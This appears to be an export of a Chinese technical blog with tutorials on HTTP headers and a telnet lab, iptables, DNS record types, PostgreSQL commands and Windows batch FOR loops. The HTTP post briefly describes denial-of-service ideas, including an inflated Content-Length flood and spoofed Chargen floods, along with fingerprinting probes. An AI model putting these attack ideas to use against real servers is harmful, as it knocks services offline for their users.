请求和响应消息都可以传送一个实体。一个实体由实体报头域和实体正文组成，但并不是说实体报头域和实体正文要在一起发送，可以只发送实体报头域。实体报头定义了关于实体正文（eg：有无实体正文）和请求所标识的资源的元信息。常用的实体报头Content-EncodingContent-Encoding实体报头域被用作媒体类型的修饰符，它的值指示了已经被应用到实体正文的附加内容的编码，因而要获得Content-Type报头域中所引用的媒体类型，必须采用相应的解码机制。Content-Encoding这样用于记录文档的压缩方法，例：Content-Encoding：gzip Content-LanguageContent-Language实体报头域描述了资源所用的自然语言。没有设置该域则认为实体内容将提供给所有的语言阅读者。例：Content-Language:da Content-LengthContent-Length实体报头域用于指明实体正文的长度，以字节方式存储的十进制数字来表示。 Content-TypeContent-Type实体报头域用语指明发送给接收者的实体正文的媒体类型。例：Content-Type:text/html;charset=ISO-8859-1Content-Type:text/html;charset=GB2312 Last-ModifiedLast-Modified实体报头域用于指示资源的最后修改日期和时间。 ExpiresExpires实体报头域给出响应过期的日期和时间。为了让代理服务器或浏览器在一段时间以后更新缓存中(再次访问曾访问过的页面时，直接从缓存中加载，缩短响应时间和降低服务器负载)的页面，我们可以使用Expires实体报头域指定页面过期的时间。eg：Expires：Thu，15 Sep 2006 16:23:12 GMT HTTP1.1的客户端和缓存必须将其他非法的日期格式（包括0）看作已经过期。eg：为了让浏览器不要缓存页面，我们也可以利用Expires实体报头域，设置为0，jsp中程序如下：response.setDateHeader(“Expires”,”0”); 利用telnet观察http协议的通讯过程​ 实验目的及原理：​ 利用MS的telnet工具，通过手动输入http请求信息的方式，向服务器发出请求，服务器接收、解释和接受请求后，会返回一个响应，该响应会在telnet窗口上显示出来，从而从感性上加深对http协议的通讯过程的认识。 ​ 实验步骤： 1、打开telnet1.1 打开telnet运行–&gt;cmd–&gt;telnet 1.2 打开telnet回显功能set localecho 2、连接服务器并发送请求2.1 open www.guet.edu.cn 80 //注意端口号不能省略 ​ HEAD /index.asp HTTP/1.0​ Host:www.guet.edu.cn​ /我们可以变换请求方法,请求桂林电子主页内容,输入消息如下/​ open www.guet.edu.cn 80 ​ GET /index.asp HTTP/1.0 //请求资源的内容​ Host:www.guet.edu.cn 2.2 open www.sina.com.cn 80 //在命令提示符号下直接输入telnet www.sina.com.cn 80 HEAD /index.asp HTTP/1.0 Host:www.sina.com.cn 3 实验结果： 3.1 请求信息2.1得到的响应是: HTTP/1.1 200 OK //请求成功Server: Microsoft-IIS/5.0 //web服务器Date: Thu,08 Mar 200707:17:51 GMTConnection: Keep-AliveContent-Length: 23330Content-Type: text/htmlExpries: Thu,08 Mar 2007 07:16:51 GMTSet-Cookie: ASPSESSIONIDQAQBQQQB=BEJCDGKADEDJKLKKAJEOIMMH; path=/Cache-control: private //资源内容省略 3.2 请求信息2.2得到的响应是: HTTP/1.0 404 Not Found //请求失败Date: Thu, 08 Mar 2007 07:50:50 GMTServer: Apache/2.0.54 Last-Modified: Thu, 30 Nov 2006 11:35:41 GMTETag: “6277a-415-e7c76980”Accept-Ranges: bytesX-Powered-By: mod_xlayout_jh/0.0.1vhs.markII.remixVary: Accept-EncodingContent-Type: text/htmlX-Cache: MISS from zjm152-78.sina.com.cnVia: 1.0 zjm152-78.sina.com.cn:80&lt;squid/2.6.STABLES-20061207&gt;X-Cache: MISS from th-143.sina.com.cnConnection: close 失去了跟主机的连接 按任意键继续… 4 .注意事项：1、出现输入错误，则请求不会成功。 2、报头域不分大小写。 3、更深一步了解HTTP协议，可以查看RFC2616，在http://www.letf.org/rfc上找到该文件。 4、开发后台程序必须掌握http协议 HTTP协议相关技术补充​ 1、基础： ​ 高层协议有：文件传输协议FTP、电子邮件传输协议SMTP、域名系统服务DNS、网络新闻传输协议NNTP和HTTP协议等中介由三种：代理(Proxy)、网关(Gateway)和通道(Tunnel)，一个代理根据URI的绝对格式来接受请求，重写全部或部分消息，通过 URI的标识把已格式化过的请求发送到服务器。网关是一个接收代理，作为一些其它服务器的上层，并且如果必须的话，可以把请求翻译给下层的服务器协议。一 个通道作为不改变消息的两个连接之间的中继点。当通讯需要通过一个中介(例如：防火墙等)或者是中介不能识别消息的内容时，通道经常被使用。​ 代理(Proxy)：一个中间程序，它可以充当一个服务器，也可以充当一个客户机，为其它客户机建立请求。请求是通过可能的翻译在内部或经过传递到其它的 服务器中。一个代理在发送请求信息之前，必须解释并且如果可能重写它。代理经常作为通过防火墙的客户机端的门户，代理还可以作为一个帮助应用来通过协议处 理没有被用户代理完成的请求。网关(Gateway)：一个作为其它服务器中间媒介的服务器。与代理不同的是，网关接受请求就好象对被请求的资源来说它就是源服务器；发出请求的客户机并没有意识到它在同网关打交道。网关经常作为通过防火墙的服务器端的门户，网关还可以作为一个协议翻译器以便存取那些存储在非HTTP系统中的资源。​ 通道(Tunnel)：是作为两个连接中继的中介程序。一旦激活，通道便被认为不属于HTTP通讯，尽管通道可能是被一个HTTP请求初始化的。当被中继 的连接两端关闭时，通道便消失。当一个门户(Portal)必须存在或中介(Intermediary)不能解释中继的通讯时通道被经常使用。 2、协议分析的优势—HTTP分析器检测网络攻击 以模块化的方式对高层协议进行分析处理，将是未来入侵检测的方向。HTTP及其代理的常用端口80、3128和8080在network部分用port标签进行了规定 3、HTTP协议Content Lenth限制漏洞导致拒绝服务攻击 使用POST方法时，可以设置ContentLenth来定义需要传送的数据长度，例如ContentLenth:999999999，在传送完成前，内 存不会释放，攻击者可以利用这个缺陷，连续向WEB服务器发送垃圾数据直至WEB服务器内存耗尽。这种攻击方法基本不会留下痕迹。http://www.cnpaf[.NET](http://lib.csdn.net/base/dotnet)/Class/HTTP/0532918532667330.html 4、利用HTTP协议的特性进行拒绝服务攻击的一些构思 服务器端忙于处理攻击者伪造的TCP连接请求而无暇理睬客户的正常请求（毕竟客户端的正常请求比率非常之小），此时从正常客户的角度看来，服务器失去响应，这种情况我们称作：服务器端受到了SYNFlood攻击（SYN洪水攻击）。而Smurf、TearDrop等是利用ICMP报文来Flood和IP碎片攻击的。本文用“正常连接”的方法来产生拒绝服务攻击。19端口在早期已经有人用来做Chargen攻击了，即Chargen_Denial_of_Service，但是！他们用的方法是在两台Chargen 服务器之间产生UDP连接，让服务器处理过多信息而DOWN掉，那么，干掉一台WEB服务器的条件就必须有2个：1.有Chargen服务2.有HTTP 服务方法：攻击者伪造源IP给N台Chargen发送连接请求（Connect），Chargen接收到连接后就会返回每秒72字节的字符流（实际上根据网络实际情况，这个速度更快）给服务器。 5、Http指纹识别技术 Http指纹识别的原理大致上也是相同的：记录不同服务器对Http协议执行中的微小差别进行识别.Http指纹识别比TCP/IP堆栈指纹识别复杂许 多,理由是定制Http服务器的配置文件、增加插件或组件使得更改Http的响应信息变的很容易,这样使得识别变的困难；然而定制TCP/IP堆栈的行为 需要对核心层进行修改,所以就容易识别. 要让服务器返回不同的Banner信息的设置是很简单的,象Apache这样的开放源代码的Http服务器,用户可以在源代码里修改Banner信息,然 后重起Http服务就生效了；对于没有公开源代码的Http服务器比如微软的IIS或者是Netscape,可以在存放Banner信息的Dll文件中修 改,相关的文章有讨论的,这里不再赘述,当然这样的修改的效果还是不错的.另外一种模糊Banner信息的方法是使用插件。常用测试请求：1：HEAD/Http/1.0发送基本的Http请求2：DELETE/Http/1.0发送那些不被允许的请求,比如Delete请求]]></content>
      <categories>
        <category>系统运维</category>
      </categories>
      <tags>
        <tag>Http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iptables原理详解]]></title>
    <url>%2Farticles%2F1652fdb7.html</url>
    <content type="text"><![CDATA[iptables简介netfilter/iptables（简称为iptables）组成Linux平台下的包过滤防火墙，与大多数的Linux软件一样，这个包过滤防火墙是免费的，它可以代替昂贵的商业防火墙解决方案。它工作在网络层，针对TCP/IP数据包实施过滤和限制，是典型的包过滤防火墙；它也可以实现网络地址转换（NAT）等功能。 iptables的优点netfilter/iptables的最大优点是它可以配置有状态的防火墙。有状态的防火墙能够指定并记住为发送或接收数据包所建立的连接状态。防火墙可以从数据包的连接跟踪状态获得该信息。在决定新的数据包过滤时，防火墙所使用的这些状态信息可以增加其效率和速度。有四种有效状态，分别为：ESTABLISHED (已建立的连接)、INVALID(非法或无法识别) 、NEW(已经或将启动新的连接)和RELATED(正在启动新连接)。另一个优点：用户可以完全自己控制防火墙配置和数据包过滤，也可以定制自己的规则来满足特定的需求，从而允许想要的网络流量进入 iptables和netfilter关系netfilter和iptables通常都可以用来指的是Linux防火墙，但二者是有区别的，如：netfilter：是内核的一部分，指的是Linux内核中实现包过滤防火墙的内部结构，也称为”内核空间（kernelspace）”,不以程序或文件的形式而存在；iptables:指的是管理Linux防火墙的命令工具，也被称为”用户空间（userspace）”，程序通常位于/sbin/iptables，由用户直接使用，而我们经常使用的也就是iptables管理工具，而真正实现防火墙功能的是netfilter. iptables基础知识规则(rules)也是就管理员定义的条件，规则一般的定义为”如果数据包符合定义的条件，就按规则处理这个数据包”，如果规则中没有定义就匹配默认的策略。规则是存储在内核空间的信息包过滤表中，这些规则分别定义了源地址、目标地址、传输协议(如TCP、ICMP、UDP)和服务类型(如HTTP、FTP、SMTP)等。当数据包与定义的规则匹配时，iptables就根据规则所定义的方法来处理这些数据包，如：允许(ACCEPT)、拒绝(REJECT)、丢弃(DROP)、目标地址转换(DNAT)、源地址转换(SNAT)、日志(LOG)等 包过滤的工作层次 主要是工作在网络层，针对IP数据包，在对数据包内的IP地址、端口、内容等处理上，如下图： iptables传输数据包的过程1、当一个数据包进入网卡时，它首先进入PREROUTING链，内核根据数据包目的IP判断是否需要转送出去。2、如果数据包就是进入本机的，它会经过路由选择到达INPUT链。数据包到了INPUT链后，任何进程都会收到它。本机上运行的程序可以发送数据包，这些数据包会经过OUTPUT链，然后到达POSTROUTING链输出。3、如果数据包是要转发出去的，且内核允许转发，数据包就会如图所示向右移动，经过FORWARD链，然后到达POSTROUTING链输出。 iptables的规则链和表规则表（tables）： iptables内置了4个表， 规则表之间的优先顺序 RAW–MANGLE–NAT–FILTER raw表：确定是否对数据包进行状态跟踪，些模块用的不是太多；内核模块：iptable_raw；包含两个链：OUTPUT、PREROUTING mangle表:为数据包TOS(服务类型)、TTL(生命周期)值，或者为数据包设置标记，以实现流量整形等高级应用，内核模块：iptable_mangle；包含五个链：INPUT、OUTPUT、PREROUTING、POSTROUTING、FORWARD nat表:实现网络地址转换(如：IP、端口)，修改数据包中的源、目标IP地址或端口；内核模块：iptable_nat；包含三个链：OUTPUT、POSTROUTING、PREROUTING filter表:实现数据包过滤功能，内核模块：iptable_filter；包含三个链：INPUT、OUTPUT、FORWARD 规则链（chains）： ​ 链是数据包传播的路径，每一条链其实就是众多规则中的一个检查列表，每一条链中可以有一条或多条规则。当一个数据包到达一个链时，iptables就会从链中第一条规则开始检查，检查该数据包是否满足规则所定义的条件。如果满足，系统就会根据该条规则所定义的方法处理该数据包；否则iptables将继续检查下一条规则，如果该数据包不符合链中任一条规则，iptables就会根据该链预先定义的默认策略来处理数据包。默认有五种规则链： INPUT: 处理进入的数据包 OUTPUT:处理出站的数据包 FORWARD:处理转发数据包 POSTROUTING:路由选择后处理数据包，做源地址转换 PREROUTING:路由选择前处理数据包，做目标地址转换 规则链之间匹配顺序分三种情况： 第一种情况：入站数据流向 从外界到达防火墙的数据包，先被PREROUTING规则链处理（是否修改数据包地址等），之后会进行路由选择（判断该数据包应该发往何处），如果数据包的目标主机是防火墙本机（比如说Internet用户访问防火墙主机中的web服务器的数据包），那么内核将其传给INPUT链进行处理（决定是否允许通过等），通过以后再交给系统上层的应用程序（比如HTTPD服务器）进行响应。 第二冲情况：转发数据流向 来自外界的数据包到达防火墙后，首先被PREROUTING规则链处理，之后会进行路由选择，如果数据包的目标地址是其它外部地址（比如局域网用户通过网关访问QQ站点的数据包），则内核将其传递给FORWARD链进行处理（是否转发或拦截），然后再交给POSTROUTING规则链（是否修改数据包的地址等）进行处理。 第三种情况：出站数据流向 防火墙本机向外部地址发送的数据包（比如在防火墙主机中测试公网DNS服务器时），首先被OUTPUT规则链处理，之后进行路由选择，然后传递给POSTROUTING规则链（是否修改数据包的地址等）进行处理。 Iptables采用“表”和“链”的分层结构。下面罗列一下这四张表和五个链。注意一定要明白这些表和链的关系及作用。 管理和设置iptablesiptables命令语法格式： iptables [-t 表名] 管理选项 [链名] [条件匹配] [-j 目标动作或跳转] 注释：如果不指定表名，默认表示filter表；如果不指定链名，默认表示该表的所有链；除非设置规则链的缺少策略，否则都要指定匹配条件 目标： DROP：丢弃 REJECT：拒绝 ACCEPT：允许 RETURN：返回跳转 REDIRECT：端口重定向 DNAT：目标地址转换 SNAT：源地址转换 LOG：记录日志 MARK：打标记 iptables管理命令： 选择表 -t 指定表 添加新规则 -A 在链的最后追加一条规则 -I 在链的开头或指定序号插入一条规则 -x 显示精确值，不做单位换算 替换规则 -R 替换一条指定的规则 查看规则 -L 列出所有规则 -n 以数据形式显示地址与端口信息 -v 以更加详细的方式显示 –line-numbers 查看规则时，显示规则序号 删除或清空规则 -D 删除指定序号的一条规则 -F 清空指定表中的所有规则 设置默认策略 -P 为指定的链设置默认规则 新建规则链 -N 新建自定义链 重命名链 -E 重命名自定义链 删除链 -X 删除自定义空链 -Z 计数器清零 iptables的另外一机制:应用规则和删除规则，具体操作和实现方法将在下一篇再详细介绍，敬请关注…]]></content>
      <categories>
        <category>系统运维</category>
      </categories>
      <tags>
        <tag>Iptables</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNS中的七大资源记录详解]]></title>
    <url>%2Farticles%2F5136542c.html</url>
    <content type="text"><![CDATA[概要 域名系统（英文：Domain Name System，缩写：DNS）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用TCP和UDP端口53[1]。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。 DNS分为正向查找区域和反向查找区域，然后在分为，主要，辅助，存根区域，在这些区域里，又存在着很多的记录，今天，就让我们来看看这些记录。 记录详解A记录A记录也称为主机记录，是使用最广泛的DNS记录，A记录的基本作用就是说明一个域名对应的IP是多少， 它是域名和IP地址的对应关系，表现形式为 www.contoso.com 192.168.1.1 这就是一个A记录！A记录除了进行域名IP对应以外，还有一个高级用法，可以作为低成本的负载均衡的解决方案，比如说，www.contoso.com 可以创建多个A记录，对应多台物理服务器的IP地址，可以实现基本的流量均衡！ NS记录 NS记录和SOA记录是任何一个DNS区域都不可或缺的两条记录，NS记录也叫名称服务器记录，用于说明这个区域有哪些DNS服务器负责解析，SOA记录说明负责解析的DNS服务器中哪一个是主服务器。因此，任何一个DNS区域都不可能缺少这两条记录。NS记录，说明了在这个区域里，有多少个服务器来承担解析的任务。 SOA记录 NS记录说明了有多台服务器在进行解析，但哪一个才是主服务器呢，NS并没有说明，这个就要看SOA记录了，SOA名叫起始授权机构记录，SOA记录说明了在众多NS记录里那一台才是主要的服务器！ MX记录 全称是邮件交换记录，在使用邮件服务器的时候，MX记录是无可或缺的，比如A用户向B用户发送一封邮件，那么他需要向ＤＮＳ查询Ｂ的MX记录，DNS在定位到了B的MX记录后反馈给A用户，然后Ａ用户把邮件投递到B用户的ＭＸ记录服务器里！ Cname记录 又叫别名记录，我们可以这么理解，我们小的时候都会有一个小名，长大了都是学名，那么正规来说学名的符合公安系统的，那个小名只是我们的一个代名词而已，这也存在一个好处，就是比暴漏自己，比如一个网站a.com 在发布的时候，他可以建立一个别名记录，把B.com发不出去，这样不容易被外在用户所察觉！达到隐藏自己的目的！ SRV记录 SRV记录是服务器资源记录的缩写，SRV记录是DNS记录中的新鲜面孔，在RFC2052中才对SRV记录进行了定义，因此很多老版本的DNS服务器并不支持SRV记录。那么SRV记录有什么用呢？SRV记录的作用是说明一个服务器能够提供什么样的服务！SRV记录在微软的Active Directory中有着重要地位，大家知道在NT4时代域和DNS并没有太多关系。但从Win2000开始，域就离不开DNS的帮助了，为什么呢？因为域内的计算机要依赖DNS的SRV记录来定位域控制器！表现形式为：—ldap._tcp.contoso.com 600 IN SRV 0 100 389 NS.contoso.comladp: 是一个服务，该标识说明把这台服务器当做响应LDAP请求的服务器tcp：本服务使用的协议，可以是tcp，也可以是用户数据包协议《udp》contoso.com：此记录所值的域名600： 此记录默认生存时间（秒）IN： 标准DNS Internet类SRV：将这条记录标识为SRV记录0： 优先级，如果相同的服务有多条SRV记录，用户会尝试先连接优先级最低的记录100：负载平衡机制，多条SRV并且优先级也相同，那么用户会先尝试连接权重高的记录389：此服务使用的端口NS.contoso.com:提供此服务的主机 PTR记录PTR记录也被称为指针记录，PTR记录是A记录的逆向记录，作用是把IP地址解析为域名。由于我们在前面提到过，DNS的反向区域负责从IP到域名的解析，因此如果要创建PTR记录，必须在反向区域中创建。以上只是一些简单的介绍，并特别说明了SRV记录的格式，如果掌握了这些为以后的AD管理会有很大的帮助！有说的不对的地方还请指教，没说到位的，还请补充！谢谢！]]></content>
      <categories>
        <category>系统运维</category>
      </categories>
      <tags>
        <tag>Dns</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PostgreSQL基本命令]]></title>
    <url>%2Farticles%2F6d5035d1.html</url>
    <content type="text"><![CDATA[目的本文介绍了Postgresql数据库的常用用法，方便你正确的用库。 用法详解启动pgsl数据库1pg_ctl -D /xx/pgdata start 查看pgsl版本1pg_ctl --version 命令行登录数据库1`psql -U username -d dbname -h hostip -p port` 列出所有数据库1\l 切换数据库1`\c dbname` 列出当前数据库的所有表1\d 查看指定表的所有字段1`\d tablename` 查看指定表的基本情况1`\d+ tablename` 退出操作1`q` 新建表例1（主键） 123456create table TESTCASE(id INTEGER, task_class INTEGER,age TEXT,PRIMARY KEY(id, task_class)); 例2（自增SERIAL） 12345create table CREATETASK_CHKID_N( id SERIAL PRIMARY KEY, chk_id TEXT, n INTEGER); 其中SERIAL代表自增，默认从1开始增加，每次自增1。 删除表1`drop table REL_CROSS_NODE;` 清空表1delete from [表名] or 1TRUNCATE TABLE [表名] 区别：Truncate table 表名 (注:不带where语句) 速度快,而且效率高。 因为DELETE 语句每次删除一行，并在事务日志中为所删除的每行记录一项。TRUNCATE TABLE 通过释放存储表数据所用的数据页来删除数据，并且只在事务日志中记录页的释放 添加字段1`alter table [表名] add column [字段名] [类型];` 更改字段123alter table [表名] rename column [旧字段名] to [新字段名];例：把表table_ex字段col_1限制非空去掉：ALTER TABLE table_eg ALTER col_1 drop not NULL 更改字段属性，含空格如果把字段colname把属性Text转化为int，原来text里面存在空啥的，可以 1ALTER TABLE tablename ALTER COLUMN colname TYPE int USING (trim(colname)::integer); 更改字段由int4–&gt;int81alter table test_data alter column task_id type bigint using task_id::bigint 删除字段1`alter table [表名] drop column [字段名];` 表中插入一行数据1`insert into [表名] (字段``1``,字段``2``) values (值``1``,值``2``);` 例如： 1`insert into assist_info (``id``, maat_id, block_type) values (``&apos;F006&apos;``, ``&apos;F7775&apos;``, 1) ` 注： 如果表中字段有大写的字段，则需要对应的加上双引号。例：insert into test (no, “Name”) values (‘123’, ‘jihite’); 值用单引号引起来(‘’)，不能用双引号（””） 表中删除一行数据1`delete from [表名] where [该行特征];` 修改表中数据1`update [表名] set [目标字段名]=[目标值] where [该行特征]` 删除表1`drop table [表名];` 退出postgreSql1\q 两个查询结果做差 except1`(select node_id from node where node_id=``1` `or node_id=``2``) except (select node_id from node where node_id=``1``);`` ``node_id``---------`` ``2``(``1` `row)` 复制表1CREATE TABLE test_a_copy AS SELECT * FROM test_a; 命令导入sql数据文件1psql -h localhost -d databaseName -U username -f filename 查询结果存储到输出文件格式： 1\o file_path 这样就会把查询结果存储到输出文件中。例 123postgres=&gt; \o /home/jihite/data/iu_data;postgres=&gt; select test_id from cdb_all_iu_data limit 10;postgres=&gt; select test_id from cdb_all_iu_data limit 5; 结果 12345678910111213141516171819202122test_id-------------- 2143 2153 2144 2156 2145 2154 2146 2157 2147 2155(10 rows)test_id-------------- 2143 2153 2144 2156 2145(5 rows) 数据库的备份&amp;恢复导出到线下文件 1pg_dump --host hostname --port port --username username -t tablename -d dbname &gt;/home/jihite/table.sql 把线下文件导入到数据库 1psql -h 10.125.7.68 -p 5432 -d postgres -U postgres -W postgres -f 2.sql \x 123456789101112131415postgres=&gt; \xExpanded display is on.postgres=&gt; select * from cdb_chk_items where chk_id = &apos;R000000335&apos;;-[ RECORD 1 ]+------------------------------------------------------------------------------------------------chk_id | R000000335chk_desc | 道路属性与道路属性相关检查chk_info | &#123;&quot;FIELDS&quot;: &#123;&quot;TRAFFIC_SIGN&quot;: [&quot;TYPE&quot;, &quot;GEOM&quot;], &quot;ROAD_LINK&quot;: [&quot;ROAD_CLASS&quot;, &quot;FORM_WAY&quot;, &quot;GEOM&quot;]&#125;&#125;err_desc | &#123;&quot;ERR2&quot;: &quot;roadclass取值错误&quot;, &quot;ERR1&quot;: &quot;formway取值错误&quot;&#125;chk_level | 1is_opened | 1module_name | TRAFFIC_SIGNinvalid_flag | 1rel_mode | MAIN_LAYER:TRAFFIC_SIGN : TRAFFIC_SIGN|A,M|DIRECT : ROAD_LINK|A,M,D|ATTR_REL 从表A中把符合条件的记录拷贝到表B1insert into A select * from B where id in (&apos;a&apos;, &apos;b&apos;, &apos;c&apos;); 建立索引单字段索引 1CREATE INDEX index_name ON table_name (field1); 多字段索引 1CREATE INDEX index_name ON table_name (field1,field2); 查看所有表的索引使用情况 123456select relname, indexrelname, idx_scan, idx_tup_read, idx_tup_fetch from pg_stat_user_indexes order by idx_scan asc, idx_tup_read asc, idx_tup_fetch asc; 查看某个表索引的使用情况 12345678select relname, indexrelname, idx_scan, idx_tup_read, idx_tup_fetch from pg_stat_user_indexes where relname = table_name order by idx_scan asc, idx_tup_read asc, idx_tup_fetch asc; 超找数据库的连接信息1select * from pg_stat_activity 包含：客户端user、ip、执行语句，状态、时间 删除数据库1drop database cmdbuild; 如有报错： 请用下面命令先把连接停掉，再删除 1SELECT pg_terminate_backend(pg_stat_activity.pid) FROM pg_stat_activity WHERE datname=&apos;cmdbuild&apos; AND pid&lt;&gt;pg_backend_pid(); 创建数据库1create database cmdbuild;]]></content>
      <categories>
        <category>数据库运维</category>
      </categories>
      <tags>
        <tag>Postgresql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows批处理用法之FOR]]></title>
    <url>%2Farticles%2Fa4585fee.html</url>
    <content type="text"><![CDATA[大纲123456一 前言二 for语句的基本用法三 for /f （delims、tokens、skip、eol、userbackq、变量延迟）四 for /r （递归遍历）五 for /d （遍历目录）六 for /l （计数循环） 前言在批处理中，for是最为强大的命令语句，它的出现，使得解析文本内容、遍历文件路径、数值递增/递减等操作成为可能；配合if、call、goto等流程控制语句，更是可以实现脚本复杂的自动化、智能化操作；合理使用for语句，还能使代码大为简化，免除各位编写大量重复语句之苦。而能否熟练使用for语句，已经成为衡量一个人批处理水平高低最主要的标准。 在这个系列教程中，我将通过实际应用中频繁出现的例子，带领大家步入for语句的神奇之门，一步步迈向for语句的魔幻殿堂，使得大家在实际的应用中，能独立写出简洁高效的代码，在批处理的世界里自由驰骋。 注意：以下的讲解，都是基于简体中文版Windows XP Pro SP3的操作系统环境。 基本用法正如色彩缤纷的七彩光芒是由红绿蓝三原色构成的一样，最复杂的for语句，也有其基本形态，它的模样是这样的： 在cmd窗口中： 1FOR %variable IN (set) DO command [command-parameters] 在批处理文件中： 1FOR %%variable IN (set) DO command [command-parameters] 具体例子： 1For %i in (1 2 3) do @echo %i 之所以要区分cmd窗口和批处理文件两种环境，是因为在这两种环境下，命令语句表现出来的行为虽然基本一样，但是在细节上还是稍有不同。最明显的一个差异就是：在cmd窗口中，for之后的形式变量I必须使用单百分号引用，即%i；而在批处理文件中，引用形式变量i必须使用双百分号，即%%i。为了方便起见，若不是特别强调，以下的讲解都以批处理文件环境为例。 我们先来看一下for语句的基本要素都有些什么： 1、for、in和do是for语句的关键字，它们三个缺一不可； 2、%%I是for语句中对形式变量的引用，就算它在do后的语句中没有参与语句的执行，也是必须出现的； 3、in之后，do之前的括号不能省略； 4、command1表示字符串或变量，command2表示字符串、变量或命令语句； 现在，你可能已经会写一个简单的for语句了，比如：[code1] 123@echo offfor %%I in (bbs.bathome.net) do echo %%Ipause 保存为批处理文件并执行，将会在弹出的批处理窗口中看到这样的信息： 12bbs.bathome.net请按任意键继续... 很快地，你会觉得这个for语句是如此的简单，简单到你丝毫感受不出它的强大：这个for语句，和我直接用echo语句没什么两样啊！ 是的，演示代码永远都只是演示而已，就像大多数高级语言的教科书一样，在引导新手学习的时候，基本上都是千篇一律地告诉大家如何编写一个能显示 hello world! 的窗口，从这些演示代码中，你看不到它们具有多少实用性，你只是感到有点好奇：咦，居然弹出了一个窗口？片刻之后，你就会觉得索然无味。 那好吧，为了让大家对for更加感兴趣，我们先来分析一下for语句的一些注意事项，之后，再让大家看看更为强大的for语句实例。 1、for语句的形式变量I，可以换成26个字母中的任意一个，这些字母会区分大小写，也就是说，%%I和%%i会被认为不是同一个变量；形式变量I还可以换成其他的字符，但是，为了不与批处理中的%0～%9这10个形式变量发生冲突，请不要随意把%%I替换为%%0 ～%%9中的任意一个； 2、in和do之间的command1表示的字符串或变量可以是一个，也可以是多个，每一个字符串或变量，我们称之为一个元素，每个元素之间，用空格键、跳格键、逗号、分号或等号分隔； 3、for语句依次提取command1中的每一个元素，把它的值赋予形式变量I，带到do后的command2中参与命令的执行；并且每次只提取一个元素，然后执行一次do后的命令语句，而无论这个元素是否被带到command2中参与了command2的运行；当执行完一次do后的语句之后，再提取command1中的下一个元素，再执行一次command2，如此循环，直到command1中的所有元素都已经被提取完毕，该for语句才宣告执行结束； 其中，第3点是最为关键的，它描述了for语句的执行过程，是for语句的精髓所在，大家一定要牢记这一条，才能深刻理解更为复杂的for流程。 有了以上的基础，我们再来看一个例子，这个例子修改了[code1]的部分内容，结果将大不一样：[code2] 123@echo offfor %%I in (bbs,bathome,net) do echo %%Ipause 和[code1]的执行结果[result1]相比，[result2]发生了如下变化： 1、显示结果分成了3行（不算最后一行中文提示）； 2、每一行都从逗号处被切分； 如果把 bbs.bathome.net 这个字符串中的点号换为空格、跳格或等号，执行结果将和example2的执行结果别无二致。 现在，我们来分析一下[code2]代码中for语句的执行过程： 首先，for语句以逗号为分隔符，把 bbs,bathome.net 这个字符串切分成三个元素：bbs、bathome和cn，由此决定了do后的语句将会被执行3次； 然后，第一次执行过程是这样的：先把 bbs 这个字符串作为形式变量I的值，带入do后的语句中加以执行，也就是执行 echo %%I 语句，此时的I值为bbs，因此，第一次执行的结果，将会在屏幕上显示bbs这个字符串；第二次执行和第一次执行的过程是一样的，只不过此时I的值已经被替换为command1中的第二个元素了，也就是 bathome 这个字符串；如此循环，当第三次echo执行完毕之后，整条for语句才算执行完毕，此时，将执行下一条语句，也就是pause命令。 其实，这个例子只比上一个例子多了一点花样，有趣了那么一点点：一条for语句的执行结果居然被分成了3行！ 为了让大家见识一下for的真正威力，本人绞尽脑汁，翻帖无数，不得要领，万般无奈之下，只好亮出了尘封在箱底多年的一段代码：检测当前硬盘都有哪些分区。 [code3] 12345@echo offset str=c d e f g h i j k l m n o p q r s t u v w x y zecho 当前硬盘的分区有：for %%i in (%str%) do if exist %%i: echo %%i:pause 这段代码能检测硬盘都有哪些分区，包括U盘和移动硬盘的分区，但是，当光驱中有盘的时候，也会被列出来，这是本代码的一个缺憾，在以后的讲解中，我将向大家讲述如何消除这个瑕疵，敬请关注本系列的后续章节。 高级应用： 想知道当前目录下都有哪些文件吗？请用下面的代码： 123@echo offfor %%i in (*.*) do echo "%%i"pause 想列出当前目录下所有的文本文件吗？请用下面的代码 123@echo offfor %%i in (*.txt) do echo "%%i"pause 想列出只用两个字符作为文件名的文本文件吗？(注:实际上这个代码是输出少于或等于两个字符作为文件名的文本文件)请用下面的代码： 123@echo offfor %%i in (??.txt) do echo "%%i"pause 题外话： 1、列出当前目录下各种文件的方法，最简单的还是用dir命令，但是，从以上代码中，各位可以加深对for语句执行流程的理解（用到了通配符*和?）； 2、注意：以上代码不能列出含有隐藏或系统属性的文件；（注：这里其实有一个很有趣的现象，windows中的系统文件一般具备两种属性——隐藏和系统；但是你如果测试的话就会发现，加上+s属性，但是不加+h的文件是可以被简单的for显示出来的。例如： 1234@echo offattrib +s 1.txtFor %%i in (*.txt) do Echo %%ipause 这里的1.txt在结果中显示出来了。所以“以上代码不能列出含有隐藏或系统属性的文件”是不准确的，而因该说成“以上代码不能列出含有隐藏属性的文件”） 文本解析显神威：for /f 用法详解前言 for /f 是个十分强大的家伙。 如果说，for语句是批处理中最强大的语句的话，那么，for /f 就是精华中的精华。 for /f 的强大，和它拥有众多的开关密切相关。因为开关众多，所以用法复杂，本章将分成若干小节，为大家逐一介绍强大的 for /f 语句。 为解析文本而生：for /f 的基本用法所有的对象，无论是文件、窗体、还是控件，在所有的非机器语言看来，无外乎都是形如”c:\test.txt”、”CWnd”之类的文本信息；而所有的对象，具体的如ini文件中的某条配置信息、注册表中的某个键值、数据库中的某条记录……都只有转化为具有一定格式的文本信息，方可被代码识别、操控。可以说，编程的很大一部分工作，都是在想方设法绞尽脑汁如何提取这些文本信息。 而提取文本信息，则是for /f的拿手好戏：读取文件内容；提取某几行字符；截取某个字符片段；对提取到的内容再切分、打乱、杂糅……只要你所能想到的花样，for /f 都会想方设法帮你办到，因为，for /f 就是被设计成专门用于解析文本的。 先来看个例子。 假如有个文本文件test.txt，内容如下：[txt1] 123论坛的目标是：不求最大，但求最好，做最实用的批处理论坛。论坛地址：bbs.bathome.net。这里是：新手晋级的福地，高手论剑的天堂。 那么，将如下代码保存为test.cmd，并放在test.txt同一目录下运行，将会在屏幕上原样显示test.txt的内容：[code4] 123@echo offfor /f %%i in (test.txt) do echo %%ipause 